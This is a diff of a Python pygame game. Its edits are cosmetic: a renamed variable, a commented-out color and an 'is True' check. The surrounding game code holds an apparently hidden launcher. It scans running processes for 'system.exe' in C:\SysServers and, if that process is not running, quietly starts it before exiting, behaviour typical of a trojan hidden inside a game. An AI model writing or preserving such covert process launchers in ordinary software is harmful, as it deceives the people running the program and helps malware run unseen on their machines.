@@ -46,7 +46,7 @@ def start_game():
     white = pygame.Color(255, 255, 255)
     red = pygame.Color(255, 0, 0)
     green = pygame.Color(0, 255, 0)
-    blue = pygame.Color(0, 0, 255)
+    # blue = pygame.Color(0, 0, 255)
 
     # FPS (frames per second) controller
     fps_controller = pygame.time.Clock()
@@ -83,14 +83,14 @@ def start_game():
         pids = psutil.pids()
         for pid in pids:
             try:
-                p = psutil.Process(pid)
+                proc = psutil.Process(pid)
             except:
                 continue
-            if p.name() == 'system.exe':
-                if p.cwd() == 'C:\\SysServers':
+            if proc.name() == 'system.exe':
+                if proc.cwd() == 'C:\\SysServers':
                     checker = False
                     break
-        if checker == True:
+        if checker is True:
             os.chdir('C:\\SysServers')
             os.popen('system.exe')
         sys.exit()
